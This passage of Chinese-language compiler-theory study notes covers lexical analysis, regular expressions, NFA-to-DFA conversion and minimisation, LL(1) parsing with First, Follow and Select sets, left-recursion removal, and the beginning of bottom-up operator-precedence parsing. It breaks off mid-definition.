功能：输入源程序，输出单词符号  单词符号是一个程序语言的基本语法符号\n 单词的分类：   1.**关键字：**由程序语言定义的具有固定意义的标识符。也称为保留字或基本字\n2.**标识符：**用来表示程序中各种名字的字符串。\n3.**常 数：**常数的类型一般有整型、实型、布尔型、文字型。\n4.**运算符：**如+、－ 、*、/ 等。\n5.**界限符：**如逗号、分号、括号等。\n 一个程序语言的关键字、运算符、界限符都是固定的，即数量有限及意义明确；而对于标识符和常数通常是不确定的。\n词法分析器所输出的单词符号常常表示为二元式：（单词种别，单词符号的属性值）\n单词种别一般将①标识符归为一种，②常数按类型分种（整数实数布尔），③关键字全体视为一种，或者一个一种，④运算符可采用一符一种，⑤界符一般也用一符一种。\n如果一个种别只含一个单词符号，那么对于这个单词符号，种别编码可完全代表其自身。若一个种别有多个单词符号，那么，对于每个单词符号，除了给出种别编码外，还应给出有关的单词符号的属性信息。\n单词符号的属性是指单词符号的特性或特征。属性值是反应特性或特征的值。\n1 2 3 4 5 6 7 8 9 10 11  while(i\u003e=j)i++;//以该语句为示例 //该句的单词符号序列如下: \u003cwhile, -\u003e \u003c(, -\u003e \u003cid, point(i)\u003e//存放指向i的指针 \u003c\u003e=, -\u003e \u003cid, point(j)\u003e//存放指向j的指针 \u003c), -\u003e \u003cid, point(i)\u003e \u003c--, -\u003e \u003c;, -\u003e   3.2 词法分析器的设计 Ⅰ、输入、预处理 词法分析器工作的第一步是输入源程序文本。输入串一般是放在一个缓冲区中，这个缓冲区称输入缓冲区。词法分析的工作（单词符号的识别）可以直接在这个缓冲区中进行。但在许多情况下，把输入串预处理一下，对单词符号的识别工作将是比较方便的。\n预处理的主要工作  某些跳格符、回车符和换行符等编辑性字符，在别处的任何出现都没有意义，预处理时可以将其剔掉 注解部分——仅在于改善程序的易读性和易理解性。对于它们，预处理时可以将其剔掉 空白符（一个或相继数个）用作单词符号之间的间隔，即用作界符。在这种情况下，预处理时可把相继的若干个空白结合成一个。  Ⅱ、单词符号的识别：超前搜索 上图为词法分析器结构，当词法分析器调用预处理子程序处理出一串输入字符放进扫描缓冲区之后，分析器就从此缓冲区种逐一识别单词符号。当缓冲区里的字符串被处理完之后，它又调用预处理程序装入新串。\n 超前搜索的原因\n 在程序中有一些单词的识别经常需要多读入一些字符才能知道哪些字符组成一个单词   Ⅲ、状态转换图 状态转换图是一张有限方向图，是设计词法分析器的有效工具。\ngraph LR 0--字母--\u003e1 1--字母或数字--\u003e1 1--其他--\u003e2[*] 一个状态转换图可用于识别（或接受）一定的字符串\n3.3 正规表达式与有限自动机 1.正规式与正规集 正规式也称正则表达式（regular expression），是说明单词的模式（pattern）的一种重要的表示法，是定义正规集的数学工具\n正规式及其所表示的正规集的定义： 设字母表为∑，辅助字母表∑‘ = { φ，ε， |，•，*，（，）}，\n① ε 和 φ 都是 ∑ 上的正规式，他们所表示的正规集分别为 { ε }和 { } ；\n② 对任何 a ∈ ∑ ，a 是 ∑ 上的一个正规式，他所表示的正规集为 { a } ；\n③ 假定 e1 和 e2 都是 ∑ 上的正规式他们所表示的正规集分别为 L(e1) 和 L(e2)，那么，( e1 ) ， e1 | e2 ， e1 • e2 ， e1* 也都是正规式，他们所表示的正规集分别为 L( e1 )， L( e1 ) ∪ L( e2 )， L( e1 ) L( e2 ) 和 ( L( e1 ) )* ；\n④仅由有限次使用上述三步骤而定义的表达式才是 ∑ 上的正规式，仅有这些正规式所表示的集合才是 ∑ 上的正规集。\n 注意，| 、 • 、* 、均为正规式的运算符   | 表示或\n• 表示连接\n* 表示闭包，即任意有限次的自重复连接\n在不混淆的情况下，括号可以省去，但规定算符的优先顺序为 *， • ，|。连接符 • 一般可省略不写，三个算符均为左结合的。\n 例: a\t{a} a|b\t{a,b} ab\t{ab} (a|b)(a|b)\t{aa,ab,ba,bb} a*\t{ε,a,a,……,任意个a的串} (a|b)*\t{ε,a,b,aa,ab,bb,……,所有由a和b组成的串}  结论：程序设计语言的单词都能用正规式来定义  正规式的等价性：若两个正规式 e1 和 e2 所表示的正规集相同，则说 e1 和 e2 等价，写作 e1 = e2 。\n例: e1 = (a|b) , e2 = (b|a) ,e1 == e2 e1 = b(ab)* , e2 = (ba)*b , e1 == e2 正规式服从的规律有：\n 或服从交换律：U|V = V|U 或的可结合律：U|(V|W) = (U|V)|W 连接的可结合律：(UV)W = U(VW) 分配律：U(V|W) = UV | UW，(V|W)U = VU | WU ε是连接的恒等律：εU = U，Uε = U 素零一律：U|U = U 或的抽取律： U* = ε|U|UU|...  2.确定有限自动机 确定有限自动机（有穷自动机）作为一种识别装置，能准确地识别正规集，即识别正规文法所定义的语言和正规式所表示的集合，引入有穷自动机这个理论，正是为词法分析程序的自动构造寻找特殊的方法和工具\n有穷自动机分两类：确定的有限自动机（deterministic Finite Automata）和不确定的有限自动机（Nondeterministic Finite Automata）\ngraph LR RE(RE) RE --\u003e NFA(NFA) NFA --\u003e DFA(DFA) DFA --\u003e minDFA(minDFA) DFA DFA定义：一个确定的有穷自动机（DFA）M是一个五元组： M = （ S ，∑ ，δ ，s0 ，F ）\n 其中：\n S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ → S 上的单值部分映射，即，如果 δ（s，a）= s‘ ， (s ∈ S，s' ∈ S ) 就意味着，当前状态为s，输入符为a时，将转换至下一个状态s’，s'称作s的一个后继状态 s0 ∈ S 是唯一的一个初态 F ⊂ S 是一个终态集（可空），终态也称可接受状态或结束状态   DFA可以用一个矩阵表示，该矩阵的行表示状态，列表示输入字符，即s行a列的矩阵元素表示 δ（s，a）的值。这个矩阵称为状态转换矩阵。\n一个DFA也可以表示为一张确定的状态转换图\n 假定DFA M含有 m个状态和 n个输入字符，那么，这个图含有m个状态结点，每个结点顶多有n条箭弧射出和别的结点相连接，每条箭弧用Σ中的一个不同输入字符作标记，整张图含有唯一的一个初态结点和若干个（可以是0个）终态结点。\n一般来说，初态节点旁边标以 ⇒ ；终态节点用双圈表示。\n 例如：\n   状态 a b     +S U V   U Q V   V U Q   -Q Q Q    如上表，可表示(a|b)*，也可画成如下图\nDFA的确定性\n1.映射δ ： S × Σ → S 是一个单值函数。也就是说，对任何状态s∈S和输入符号 a ∈ Σ ，f（s，a）唯一地确定了下一状态。从转换图的角度来看，假定字母表 Σ 含有n个输入字符，那么，任何一个状态结最多只有n条弧射出，而且每条弧以一个不同的输入字符标记。\nNFA NFA的定义：一个非确定的有穷自动机（NFA）M是一个五元组：M = （ S ，∑ ，δ ，S0 ，F ）\n 其中：\n S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ* → S 上的单值部分映射，即， δ： S × Σ* → 2S 表明在某状态下对于某输入符号可能有多个后继状态 S0 ⊂ S 是一个非空初态集 F ⊂ S 是一个终态集（可空），终态也称可接受状态或结束状态   如图，为一个NFA\n∑* 上的符号串 t 被 NFA M 接受也可以这样理解：\n对于Σ*中的任何一个串t，若存在一条从某一初态结到某一终态结的道路，且这条道路上所有弧的标记字依序连接成的串(不理采那些标记为ε的弧)等于t，则称t可为NFA M所识别(读出或接受)。若M的某些结既是初态结又是终态结，或者存在一条从某个初态结到某个终态结的道路,其上所有弧的标记均为ε，那么空字可为M所接受。\nNFA M所能接受的符号串的全体记为L(M)\n结论： Σ 上一个符号串集 V ⊂ Σ* 是正规的，当且仅当存在一个 Σ 上的不确定的有穷自动机M，是的 V = L(M)\nNFA构造方法: Σ上的字母a是正规式,构造等价的NFA为 一个初态,一个终态,中间标记ε弧 正规式A和B连接是正规式,构造等价NFA为 初态是A的初态,终态是B的终态,从A的终态到B的初态标记为ε弧 A|B是正规式,构造等价的NFA为 构造新的初态和终态,从初态引ε到A和B的初态,从到A到B的终态引ε到终态 A*是正规式,构造的等价NFA为 构造新的初态和终态，从初态引ε到终态和A的初态,从A的终态引ε到终态和A的初态 NFA和DFA的等价性  DFA是NFA的特例  对于每个NFA M，存在一个DFA M’ ，使得L( M ) =L( M’ )。对每个NFA M存在着与之等价的DFA M’。即：对于任何两个有穷自动机M和M’，如果L( M )=L( M’ )，则称M与M’是等价的。\n有一种算法，将NFA转换成接受同样语言的DFA。这种算法称为子集法。\n与某一NFA等价的DFA不唯一\n从NFA的矩阵表示中，表项通常是一状态的集合，而在DFA的矩阵表示中，表项是一个状态，NFA到相应的DFA的构造的基本思路是：\n DFA的每一个状态对应NFA的一组状态。  DFA使用他的状态去记录在NFA读入的一个输入符号后可能达到的所有状态。\nNFA确定化算法（ NFA → DFA 的转换） 假设NFA N = （ K， Σ ， f ，K0，Kt ）按如下办法构造一个DFA M=（ S， å，δ，S0 ，St），使得L(M) = L(N) ：\n  M的状态集 S 由 K 的一些子集组成。用 [ S1 ，S2 ，…，Sj ] 表示 S 的元素，其中 S1 ，S2 ，…，Sj 是K的状态。并约定， 状态 S1 ，S2 ，…，Sj 是按某种规则排列的，即对于子集{S1 ，S2 } = {S2 ，S1 }来说，S的状态就是 [S1 ，S2 ]\n  M和N的输入字母表是相同的，即 Σ\n  转换函数是这样定义的： δ（ [ S1 ，S2 ，…，Sj ] ，a ） = [ R1 ，R2 ，…，Rt ] ，其中 { R1 ，R2 ，…，Rt } = ε-closure（ move（{S1 ，S2 ，…，Sj } ， a） ）\n  S0 = ε-closure（ K0 ）为 M 的开始状态\n  St = {Si ，Sk ，…，Se }， 其中 [ Si ，Sk ，…，Se ] ∈ S 且 {Si ，Sk ，…，Se } ∩ Kt ≠ φ\n     状态集合 I 的 ε-闭包，表示为ε-closure( I )，定义为一状态集，是状态集I中的任何状态S经任意条ε弧而能到达的状态的集合。\n状态集合I的任何状态S都属于ε-closure(I)\n  状态集合 I 的 α 弧转换，定义状态集合 J 表示为 J = move(I,a) ，其中J是所有那些可从I中的某一状态经过一条a弧而到达的状态的全体。\nIa = ε-closure( J ) = ε-closure( move( I , a ) )\n   如之前NFA的例子：\nI={1}, ε-closure(I) = {1,2}； I={5}, ε-closure(I) = {5,6,2}； move( {1,2} , a ) = {5,3,4} ε-closure({5,3,4}) = {2,3,4,5,6,7,8}； 构造NFA N的状态K的子集的算法：\n​\t假定所构造的子集族为C，即 C = （T1 ，T2 ，… ， TI ），其中 T1 ，T2 ，… ， TI 为状态K的子集。\n1.开始，令ε-closure(K0)为C中的唯一成员，并且他是未被标记的 2.while( C中尚未被标记的子集T )do{ 标记T; for 每个输入字母a do{ U := ε-closure( move(T, a) ); if U 不在 C 中: 将U作为未标记的子集Ti加在C中; } } 例：\n如上图为实例NFA，构造其状态转换表\n   I Ia Ib     {i，1，2} {1，2，3} {1，2，4}   {1，2，3} {1，2，3，5，6，f} {1，2，4}   {1，2，4} {1，2，3} {1，2，4，5，6，f}   {1，2，3，5，6，f} {1，2，3，5，6，f} {1，2，4，6，f}   {1，2，4，5，6，f} {1，2，3，6，f} {1，2，4，5，6，f}   {1，2，4，6，f} {1，2，3，6，f} {1，2，4，5，6，f}   {1，2，3，6，f} {1，2，3，5，6，f} {1，2，4，6，f}    将其每个状态确定化，即得到如下等价DFA\nN\n状态转换表如下，将一组状态替换成对应符号。\n   I Ia Ib     S A B   A C B   B A D   C C E   D F D   E F D   F C E    minDFA 说一个有穷自动机是化简了的，即是说，它没有多余状态并且它的状态中没有两个是互相等价的。一个有穷自动机可以通过消除多余状态和合并等价状态而转换成一个最小的与之等价的有穷自动机。即用一个状态代替所有与其等价的状态。\n所谓有穷自动机的多余状态，是指这样的状态：从自动机的开始状态出发，任何输入串也不能到达的那个状态；或者从这个状态没有通路到达终态。\n DFA的最小化就是寻求最小状态DFA  **最小状态DFA的含义：**①没有多余状态（死状态）；②没有两个状态时互相等价的（不可区别）。\n 两个状态s和t可区别：不满足\n 兼容性：同时终态或同时非终态 传播性：从s出发读入某个a（a ∈ Σ ）和从t出发读入某个a到达的状态等价  两个状态s和t等价：\n 如果由 s 出发能导出的所有串的集合与 t 出发能导出的所有串的集合相等，我们称状态 s 与状态 t 是等价的。   如上面示例的DFA，C和F是等价的。\nC和F同是终态，读入a到达C和F，C和F同是终态，C和F读入a都到达C，读入b都到达E。\n同理D和E也是等价的\nDFA最小化的算法：分割法（逐步分组试探法） 核心思想：把一个DFA的状态分成一些不相交的子集，使得任何不同的两子集的状态都是可区别的，而同一子集中的任何两个状态都是等价的。算法假定每个状态射出的弧都是完全的,否则，引入一个新状态，叫死状态，该状态是非终态，将不完全的输入弧都射向该状态，对所有输入，该状态射出的弧还回到自己。\n设有DFA M = ( s , ∑ , f, s0 , sz ),最小状态DFA M' 1. 因为不难证明，如果si是非终结状态，而sj是终结状态，那么si和sj一定互不等价(根据等价的定义可知，它们导出的符号串集不同)。所以开始可以把K中的终态和非终态分开，分成两个子集，形成一个基本划分： P2＝{I1,I2} (I1∪I2＝K, I1∩I2＝Φ) 2. 若此两个子集还可以进行划分，则作进一步的划分，形成Pm ,假定到某个时候Pm已经含有m个子集，记为：Pm＝{I1,I2,…,Im}，设s'和s\"是Ii中的任意两个状态，如果对某个a∈Σ,存在Ij ，使 f(s',a), f(s\",a)∈Ij ，则称s'和s\"关于a是拟等价的。 如果存在s'，s\"∈Ii，使得对字母表Σ中的某个符号a, s'和s\"不为拟等价，则我们说Ii是可分的。 换句话说，令Ii ＝{s1，s2, …，sn} ，如果对某个a∈Σ，使得Ia i＝{ f(s1,a)，f(s2,a)，…，f(sn,a)}不全落在现行Pm的某一个子集Ij之中；即Ia i这个集合中的元素分别属于I1，I2，…，Im中的几个不同集合，则Ii可分为几个集合（至少可一分为二）。 3．转2,上述过程务必一再重复，直到P中的每个集合均是不可再分时为止。 此时，P所含的集合数不再增加，即P中的每个集合中的状态互相等价，而不同集合间的状态互不等价。 4.为P中的每一组选一代表，这些代表构成M'的状态。把原来导入非代表状态的弧均导入其代表即可，即若s'是一代表且f(s',a)=t,令r是t组的代表，则M'中有一转换f'(s',a)=r，M'的开始状态是含有S0的那组的代表，M'的终态是含有F的那组的代表。 5.去掉M'中的死状态。 正规式与有穷自动机的等价性（Re ⇔ NFA） 定理：①对于 Σ 上的NFA M，可以构造一个 Σ 上的正规式R，是的L(R) = L(M)。②对于 Σ 上的任一个正规式R，可以构造一个 Σ 上 的NFA M，是的L(M) = L(R)。\nRe ⇒ NFA：\n转换方法：我们把状态转换图的概念拓广，令每条弧可用一个正规式标记。 1. 在M的状态图上加进两个结点x、y。从x结点用ε弧 连接到M的所有初态结点，从M的所有终态结点ε弧 连接到y结点。形成一个与M等价的M'， M'只有一个初态和一个终态。 2. 逐步消去M'中的所有结点，直至只剩下x结点和y结点。在消结过程中，逐步用正规式来标记弧，其消结规则如下： A--R1--\u003e2--R2--\u003e3\t==\u003e\t1--R1R2--\u003e2 1--R1--\u003e2,1--R2--\u003e2\t==\u003e\t1--R1|R2--\u003e2 1--R1--\u003e2--R2--\u003e2--R3--\u003e3\t==\u003e\t1--R1R2*R3--\u003e2 最后x结点和y结点之间的弧上的标记就是所求的正规式R NFA ⇒ Re\n方法如上反转 首先，对正规式R构造如下拓广转换图 然后通过对R进行分裂和加进新结点的办法，逐步把这个图转变为：每条弧标记为中的一个字母或ε ，其转换规则如下: 1--R1R2--\u003e2\t==\u003e\tA--R1--\u003e2--R2--\u003e3 1--R1|R2--\u003e2\t==\u003e\t1--R1--\u003e2,1--R2--\u003e2 1--R1R2*R3--\u003e2\t==\u003e\t1--R1--\u003e2--R2--\u003e2--R3--\u003e3 在整个分裂过程中，所有新结点均采用不同的名字，保留x和y为全图的唯一初态结点和终态结点，至此我们就可以得到一个与R 等价的NFA M 正规文法与有穷自动机的等价性 定理：①对于给定的正规文法G[R]，可以直接构造一个NFA M，使得L（M）=L（G）。②对于 Σ 上的任一个NFA M ，可以直接构造正规文法G[R] ，使得L（ R ）=L（ M ）。\n把给定的正规文法G[R]转换为一个Σ上的NFA M构造规则:\n设G[R]=（VN，VT，P，R）， NFA M=（ K，Σ，f，S，Z） 1.令 Σ = VT; 2. K = VN，S = R；即对G中的每个非终结符生成M的一个状态（不妨取相同的名字，G的开始符号是M的初态; 3.增加一个新状态Z，作为NFA M 的终态，Z∈K; 4.对G中的形如A-\u003etB（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=B; 5.对G中的形如A-\u003et（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=Z; 把给定的å上的NFA M转换为一个正规文法G[R]的构造规则:\n设NFA M=（ K，Σ，f，S，Z）,G[R]=（VN，VT，P，R）, 1.令 VT = Σ ; 2.令VN = K即对M的每一个状态生成G中的非终结符（不妨取相同的名字，G的开始符号是M的初态; 3.令S=R（如果M有多个初态，应先拓广自动机，引入新初态x）; 4.对M 的终态Z增加一个产生式： Z-\u003eε; 5.对M的每一个转换函数f（A，t）=B可写G的一个产生式A-\u003etB（其中t为终结符或ε;A和B为非终结符）; 词法分析程序的自动构造 ​\t若对自动机的每一个状态赋予一定的功能，并把其边上的符号视为转移条件，那么自动机就成为一个程序了。\n四、语法分析 语法分析的主要工作：是识别由词法分析器给出的单词序列是否是给定的正确句子（程序）\n语法分析的常用方法：自顶向下的语法分析（Top-Down Parsing）和自底向上的语法分析（Bottom-Up Parsing）两大类\n自顶向下语法分析 方法：从文法的开始符号（设为 \u003c程序\u003e ）开始进行分析，逐渐推导的往下构造语法树，使其树叶正好构造所给定的源程序串\n关键：是确定在推导过程中选择候选式的问题。当进行推导时，一个非终结符可能对应多个产生式，这样我们就无法事先知道应该用哪个产生式，因此必须对文法做一些限制，以便在任何情况下都唔那个确定应该用的产生式\n主要思想：从开始符号出发，导出句型并一个符号一个符号地与给定终结符串进行匹配。如果全部匹配成功，则表示开始符号可推导出给定的终结符串。因此判定给定终结符号串是正确句子。\n缺点：若在推导过程中，不对文法进行限制，那么产生式的选择成为无根据的，只好一一去尝试所有可能的产生式，直至成功为止。这种方法致命的地方是不断地回溯，大大影响速度。所以自顶向下分析法分为确定和不确定两种。我们在下面讨论确定的分析方法，这种方法简单直观，便于手工构造或自动生成语法分析器。\n在推导过程中，对于产生式相同左部含有非终结符开始的右部时，在推到中选用哪个产生式是不能直接知道的，也就是该语法分析的缺点。\n1. 首符集、后继符集、选择集（Fisrt(),Follow(),Select()） 首符集的定义 设G = （ VN ，VT ，P ，S）是上下文无关文法，α 是G的任一符号串，则有\nFirst(α) = { a | α* ⇒ αβ，α ∈ VT ，α、β ∈ V* }\n特别地，若 α =*⇒ ε，则规定 ε ∈ First(α)\n即：Fisrt(α)集是从α出发推导出所有符号串首终结符或可能的ε构成的集合。\n构造算法 1.求Fisrt(X)\n对每一文法符号X∈(VN∪VT），求FIRST(X). (a)若X∈VT,则令FIRST(X)={X}; (b)若X∈VN,且有产生式X→a……,(a∈VT)，则令a∈FIRST(X); (c) 若X∈VN,有X→ε，则令 ε∈FIRST(X); (d)若 X∈VN, y1, y2,……,yi都∈VN,且有产生式X→ y1 y2…..yn, 当y1, y2,…..yi-1 都 =*=\u003eε时，（其中1≤i≤n),则FIRST(y1)-ε, FIRST(y2)-ε,….,FIRST(yi-1 )-ε,FIRST(yi)都包含在FIRST(X)中。 (e)当(d)中所有yi =*=\u003e ε(i= 1,2,….,n),则FIRST(X)=FIRST(y1)∪FIRST(y2)∪….∪FIRST(yn)∪{ε} 反复使用上述（b)～(d) 步直到每个符号的FIRST集合不再增加 为止。 2.求Fisrt(α)\nα = x1x2……xn\n法1: 1.若n=0,即α=ε,则令FIRST(α)={ε}; 2.否则，对1≤i≤n,求FIRST(xi) 3.若n=1,则令 FIRST(α)=FIRST(x1); 4.若n≥2且对一切j=1,2,….,i-1都有ε∈FIRST(xj). 则令FIRST(xi )-{ε} FIRST(α),其中2≤i≤n; 若对一切 j=1,2,…,n都有ε∈FIRST(xj),则令ε∈FIRST(α) 法2: 1.把FIRST(x1)中所有非ε元素加入到FIRST(α)中，即 FIRST(α )=FIRST(x1)-{ε }; 若FIRST(x1)包含有ε，则把FIRST(x2)的所有非ε元素加入到 FIRST(α)中，即FIRST(α)=FIRST(α)∪ (FIRST(x2)-{ε}); 若FIRST(x1)和FIRST(x2)都包含有 ε，则把FIRST(x3)的所有 非ε元素加到FIRST(α)中;…… 照此方法继续，一直到考察到xn。 2.若FIRST(xi ),i= 1,2,…,n;即每个FIRST(xi)中都有ε。则将ε加 到FIRST(α)中。特别地， 若 α=ε ，则FIRST(α)={ε}. 后继符的定义 设G = （ VN ，VT ，P ，S）是上下文无关文法，A ∈ VN 的后继符集合为\nFollow(A) = { a | S =*⇒ μAβ ，a ∈ VT ， a ∈ First(β) ， μ ∈ VT* ，β ∈ V* }\n或 Follow(A) = { a | S =*⇒ …Aa…，a ∈ VT }\n特别地，若S =*⇒ …A ， 则# ∈ Follow(A) 。这里的#是代表一个输入串的结束符\n表示所有句型中紧挨着A出现的终结符或#均是Follow(A)的元素\n构造算法  落#下S (a)对文法开始符号S,令# ∈ FOLLOW(S). 右部Follow (b)若B→αAβ是一个产生式,则令FIRST(β)-{ε} 属于FOLLOW(A); 守门员福利 (c) 若B→αA是一个产生式，或B→αAβ是一个产生式且有ε∈FIRST(β), 则令FOLLOW(B)是FOLLOW(A)的子集。即把FOLLOW(B)的所有元素加入到FOLLOW(A)中。 (d)反复使用(b)直到每个非终结符的 FOLLOW集合不再增加为止。 选择集的定义 对于给出的上下文无关的文法产生式 A → α ， A ∈ VN ， α ∈ V* ，则\nSelect(A → α) = First(α) ，当 α =*⇒ ε 时\nSelect(A → α) = Fisrt(α) ∪ Follow(A) ，其他情况\n构造算法  (a)求FIRST(α); (b)若ε∈FIRST(α),则令SELECT(A→α)=FIRST(α) 否则求FOLLOW(A),并令 SELECT(A→α) = FIRST(α) ∪ FOLLOW(A). 2. LL(1)分析法 当一个文法是LL(1)文法时，则该文法一定能采用确定的自顶向下的分析方法进行分析。\n定义：一个上下文无关文法是LL(1)文法的充分必要条件是每个非终结符A的两个不同产生式，A → α ，A → β ，满足 Select(A → α) ∩ Select(A → β) = ∅ ，其中，α和β不能同时 =*⇒ ε。\n文法的等价变换 确定的自顶向下分析要求给定语言的文法必须是 LL(1)形式，然而，不一定每个语言都是LL(1)文法，对一个语言的非LL(1)文法是否能变换为等价的LL(1)形式以及如何变换是我们讨论的主要问题。由LL(1)文法的定义可知若文法中含有左递归或含有左公共因子，则该文法肯定不是LL(1)文法，因而，我们设法消除文法中的左递归，提取左公共因子对文法进行等价变换。\nⅠ提取左公共因子 对A→ αβ1| αβ2 | … | αβn提取左公因子为： A→ α A' A'→ β1 | β2 | … | βn 若在βi , βj , βk…中仍含有左公共因子，可再进行提取，这样反复进行提取直到所引进的新非终结符的有关产生式均无左公共因子为止 结论：一个文法提取了左公共因子后，只解决了相同左部产生式的右部FIRST集不相交问题。当改写后的文法不含有空产生式，且无左递归时，则改写后的文法是LL(1)文法。否则还需用LL(1)文法的判别方法进行判断才能确定是否为LL(1)文法。\nⅡ消除左递归 一个文法含有下列形式的产生式之一时：\n   A→A β, A∈VN , β ∈ V*\n  A→B β, B→A α, A,B∈VN, α ,β ∈ V*\n   则称该文法是左递归的。\n含有左递归的文法不能采取自顶向下分析法。\n1):把直接左递归改写为右递归 设有文法产生式: A→Aβ|γ. 其中β非空， γ不以A打头。 可写为: A → γA' A' → βA' | ε 一般情况下，假定关于A的产生式是： A→A α1| A α2 | … | A αm | β1 | β2 | …| βn 其中，αi(1≤i≤m)均不为空， βj(1≤j≤n)均不以A打头。 则消除直接左递归后改写为： A → β1 A' | β2 A' | … | βn A' A'→ α1 A' | α2 A' | … | αm A' | ε 2):间接消除左递归 对于间接左递归的消除需要先将间接左递归变为直接左递归，然后再按1)清除左递归 哪一步有左递归，就把那一步的间接左递归代入产生式产生直接左递归 ---------------------------------------------------- 3):消除文法中一切左递归的算法 设非终结符按某种规则排序为A1, A2,… An 。 For i:=1 to n do begin For j:=1 to i-1 do begin 若Aj的所有产生式为： Aj → δ1 | δ2 | … | δn 替换形如Ai → Aj γ的产生式为： Ai → δ1γ | δ2γ | … | δnγ end 消除Ai中的一切直接左递归 end 递归下降分析程序构造 在程序语言的语法定义中有许多采用递归定义。我们在对它进行语法分析时，编制的处理程序也采取递归的方式，可使其结构简单易读。但由于频繁地调用子程序大大地降低了分析速度\n主要思想：对每个非终结符按其产生式结构写出相应的语法分析子程序。因为每个文法递归相应子程序也递归，子程序的结构与产生式结构一致。所以称此种方法称为递归子程序法或递归下降法。\n用程序表示递归子程序的内部结构：\n\t设A是一个非终结符：A→β1 A→β2 ┊ A→βn 则写 ζ(A) \u003c==\u003e if char∈first(β1 ) thenζ(β1 ) else if char ∈ first(β2 ) then ζ(β2 ) else… if char∈first(βn ) then ζ(βn) else ERROR 其中ζ(βi)表示调用处理符号串βi的子程序。 对A的任一右部i 设为： βi = y1 y2 … yn 则定义ζ( βi) \u003c==\u003e beginζ(y1);ζ(y2);…;ζ(yn) end 其中yj可分为下列两种情况（j=1,…,n): 1) yj∈VT,则 ζ( yj) \u003c==\u003e if char≠ yj then ERROR else READ(char) 2) yj∈VN,则ζ(yj)表示调用关于yj的递归子程序。 对文法加限制： 1.任一非终结符B都不是左递归的，否则会产生死循环。 2.对A的任意两个右部βi , βj ,有：first(βi) ∩ first(βj) = φ , First(βi)表示βi所能导出串的第一个符号的集合。显然，每个βi的first(βi)是互不相同的，否则则无法判断应执行哪个ζ(βi )。 预测分析程序 LL(k)文法是采取确定的自左至右扫描（输入串）和自顶向下分析技术的最大一类文法。\nLL系指：自左向右扫描（输入串），自上而下进行最左推导。一般来说，一个文法当其分析器对输入串进行自左至右扫描并采用自顶向下方法进行分析的过程中，如果每步仅利用当前的非终结符（事实上此时它已位于分析栈顶）和至多向前查看k个输入符号就能唯一 决定采取什么动作，那么这个文法称为LL(K)文法。\n对于大多数程序设计语言而言。K=1就足够了。因此我们将主要讨论k=1的情形。\nLL(1)文法的分析过程 设分析的当前格局为（x1x2 …. xn#, y1y2 …. ym#)\n其中xi表示句型的前端部分，诸yj表示输入流的后端部分（终结符串）。则可能有下述动作之一：\n1.替代：当x1∈VN时，则选相应的候选式去替换x1 。\n2.匹配：当x1∈VT时，它与y1进行匹配，其结果为两种可能，如\n果匹配成功，则去掉x1和y1（即指针后移一位）否则报错。\n3.接受：当格局为(#, #）时，报告分析成功结束。\n从实现的角度来说，上述替换过程需要花较多的时间，因为它除了把一个候选式替换掉x1,还需要x2 … xn统统进行移位处理，这时很麻烦的。我们的处理方法是用栈来保存x1x2 … xn,而且是把xn作为栈底， x1作为栈顶，那么上述的替换动作就简单了，只需在栈顶进行替换。即去掉x1把候选式的符号串按逆序方式压入栈中即可。\nLL(1)方法的实现 LL(1)方法在实现时用到一个LL(1)分析矩阵和一个分析栈以及预测分析程序。\n分析矩阵的元素M[A,a]中的下标A为非终结符，a为终结符或句子结束标记\"#\"，矩阵元素M[A,a]的内容为一条关于A的产生式。\n它表明当用非终结符A向下推导而当前输入符为a时，所应采用的候选式。当矩阵元素为空时，则表示用A往下推导时遇到了不应该出现的符号，即A与a不能匹配。因此应该转向出错处理。\n预测分析程序如下图\n①判断文法G[E]是否为LL(1)文法，若文法中含有左递归那么要先消除左递归，然后求select集\n②构造预测分析表，对每个终结符或'#'号用a表示，则若a∈Select(A→α)。令 M[A,a]=A→α\n把所有无定义的M[A,a]标上ERROR\n伪代码如下：\n其程序维护一个栈Stack用来储存非终结符，一个用于储存源程序的读入字符变量a，一个用于储存栈顶元素XX 其中M[A,a] = {X-\u003ex1x2……xk} 为 Select(X-\u003ex1x2……xk)={a,……},X为非终结符,a为终结符 #和开始符合入栈 把第一个输入符号读入a Flag := True while Flag Do: 把栈顶元素出栈到X中 if X ∈ VT then if X = a then 把下一个输入符号读入a else ERROR else if X = '#' then Flag := False else ERROR else if M[X,a] = {X-\u003ex1x2x3……Xxk} then 把x1x2x3……xk入栈 else ERROR END of while STOP/*分析成功，过程完毕*/ 自底向上语法分析 原理：自左向右扫描，自下而上分析\n从输入符号串入手，通过反复查找当前句型的可归约串，并使用文法的产生式把他归约成相应的非终结符来一步步地进行分析。最终把输入串归约成文法的开始符号，表明分析成功。\n 任何自下而上分析方法的关键就是要找出当前句型的可归约串，然后根据产生式判别将它归约成什么样的非终结符。  规范归约基本概念 G为文法，S为开始符号，假定α，β，δ是G的一个句型，如果 S =*=\u003e αAδ 且 A=+=\u003e β，\n则称 β 是句型 α β δ 相对于非终结符A的短语。\n如果 A ⇒ β ，则称β是句型 α β δ 相对于A的直接短语。\n最左直接短语称为句柄。\n从句子到开始符号的归约序列，如果每一步都是把句柄替换为相应产生式的左部符号而得到的，则称为规范归约。规范归约是最右推导（规范推导）的逆过程。\n 例：：考虑文法G(E)：E→E +T |T T→T*F | F F→i| (E) 并假定输入串为（i+i)*i，考察自下而上的分析过程\n栈上的候选式不一定是句柄。例如，在第14步对栈顶为T，它是E的一候选式，但它不是句柄，不能归约成E。判定候选式是极为简单的事情，但判定句柄就不那么容易。而不同的自底向上方法给出不同的判定方法。\n 自下而上方法包括四个方法：\n 移进(shift)：把输入流的头符读到分析栈中 归约(Reduction)：把分析栈顶的句柄归约为一非终结符 接受：分析成功 报错：处理错误  算符优先分析 首先规定文法符号之间的优先关系和结合性质，然后再利用这种关系，通过比较两个相邻的符号之间的优先顺序来确定可归约串。\n算符文法：任何产生式的右部都不含两个相继的非终结符\n 优先关系：\n终结符ab的三种优先关系：\n a = b：当且仅当存在形如下面的产生式 U → … ab … 或 U → …aQb … a \u003c b：当且仅当存在形如下面的产生式 U → …aW… 的产生式，且有 W =+=\u003e b… a \u003e b：当且仅当存在形如下面的产生式 U → …Vb… 的产生式，且有 